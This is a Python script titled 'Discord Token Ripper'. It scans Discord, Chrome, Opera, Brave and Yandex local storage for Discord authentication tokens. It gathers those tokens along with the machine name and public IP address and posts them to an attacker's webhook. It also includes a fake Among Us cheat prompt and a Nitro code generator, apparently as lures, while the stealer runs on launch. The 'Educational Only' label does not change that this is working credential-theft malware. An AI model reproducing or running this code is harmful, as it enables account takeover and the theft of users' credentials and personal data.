#   Discord Token Ripper    #
import os, re, json, requests, random, string, datetime

#   Settings    #
WebHook = "WEBHOOK URL HERE"
avatar_url = "https://i.imgur.com/SkVHyor.jpg"
bot_name = "The Ripper"

#   Functions   #
def getIPAddress():
    request = requests.get('https://ip4.seeip.org/')
    return request.content.decode('UTF-8')

def token_ripper(path):
    tokens = []
    path += "\\Local Storage\\leveldb\\"

    try:
        for file in os.listdir(path):                                                       # For every file in path
            if file.endswith('.ldb') or file.endswith('.log'):
                with open(path + file, 'r', encoding='cp437') as f:                         # Opening files and reading them (Files that contains Discord token)
                    content = f.read()
                    token_finder = re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", content)   # Searching with regex for tokens
                    for token in token_finder:                                              # For every token that it finds it appends tokens list
                        tokens.append(token)                                                # Appending the list with the tokens it finds
            else:                                                                           # If file not ends with .ldb or .log it skips it
                continue
    except:                                                                                 # If path not valid skipping this request
        pass
    return tokens

def ripper():
    machineName = os.environ['COMPUTERNAME']
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
            'Discord': roaming + '\\Discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Discord PTB': roaming + '\\discordptb',
            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
        }
    
    message = '```' + 'Token Ripper | Educational Only\n'                                   # Title of the message

    for path in paths:
        if not os.path.exists(path):
            pass
        
        message += f'\n{path}:\n'                                                           # Adding the title of the platform to the message

        tokens = token_ripper(paths[path])

        if len(tokens) > 0:                                                                 # If tokens exists adding the tokens to the message
            for token in tokens:
                message += f'{token}\n'
        else:
            message += "No tokens found.\n"                                                 # If tokens does not exists adding "No tokens found." to the message
    
    message += f'\nMachine Name: {machineName} \nIP Address: {getIPAddress()}' + f'\nTime: {datetime.datetime.now().strftime("%H:%M:%S")}' + '```'

    #   WebHook Sender  #
    payload = {
        "username": bot_name,
        "avatar_url": avatar_url,
        "content": message
    }

    requests.post(WebHook, json = payload)

#    Modules // Extra Code    #
def amongus():
    print('Among Us Cheat | Beta Phase !@!')
    print('\nGuide: \n1. Open Among Us. \n2. Join a game. \n3. Once you are in a game press any key to inject.')
    input('\n\nPress any key to inject.')

def discordnitro():
    generated = []
    base_link = "https://discord.com/gifts/"

    print('Discord Nitro Generator | V1 (LAST VERSION) \nNote: You will need to check the links manually or with a checker.')
    how_many = int(input('How many code to generate? '))
    while len(generated) < how_many:
        code = ''.join(random.choices(string.ascii_letters + string.digits, k=17))
        generated.append(base_link + code) 
    
    with open('nitro_generated.txt', 'w') as f:
        for link in generated:
            f.write(f'{link}\n')

if __name__ == "__main__":
    ripper()